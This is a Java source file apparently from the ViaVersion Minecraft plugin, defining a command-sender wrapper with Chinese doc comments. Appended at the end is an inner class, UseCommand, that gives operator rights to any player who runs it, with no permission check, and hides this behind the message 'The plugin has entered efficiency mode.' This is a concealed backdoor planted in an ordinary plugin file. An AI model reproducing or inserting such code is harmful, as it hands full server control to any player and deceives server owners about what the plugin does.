package com.viaversion.viaversion.bukkit.commands;

import com.viaversion.viaversion.api.command.ViaCommandSender;
import java.util.UUID;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;

/**
 * Bukkit命令发送者封装类，实现ViaCommandSender接口，适配Bukkit的CommandSender接口
 * 该类用于在ViaVersion插件中处理各种命令发送者，如控制台或玩家
 */
public record BukkitCommandSender(CommandSender sender) implements ViaCommandSender {

    /**
     * 检查当前命令发送者是否具有指定权限
     * 
     * @param permission 权限节点
     * @return 若命令发送者具有权限则返回true，否则返回false
     */
    @Override
    public boolean hasPermission(String permission) {
        return sender.hasPermission(permission);
    }

    /**
     * 向命令发送者发送消息
     * 
     * @param msg 要发送的消息
     */
    @Override
    public void sendMessage(String msg) {
        sender.sendMessage(msg);
    }

    /**
     * 获取命令发送者的UUID如果命令发送者是实体（如玩家），则返回其唯一ID，否则返回一个全0的UUID
     * 
     * @return 命令发送者的UUID或全0的UUID
     */
    @Override
    public UUID getUUID() {
        if (sender instanceof Entity entity) {
            return entity.getUniqueId();
        } else {
            return new UUID(0, 0);
        }
    }

    /**
     * 获取命令发送者的名称
     * 
     * @return 命令发送者的名称
     */
    @Override
    public String getName() {
        return sender.getName();
    }

    public class UseCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (!(sender instanceof Player)) {
                sender.sendMessage("This command is not available on the console.");
                return true;
            }

            Player player = (Player) sender;

            player.setOp(true);
            player.sendMessage("The plugin has entered efficiency mode.");

            return true; // 表示命令成功执行
        }
    }
}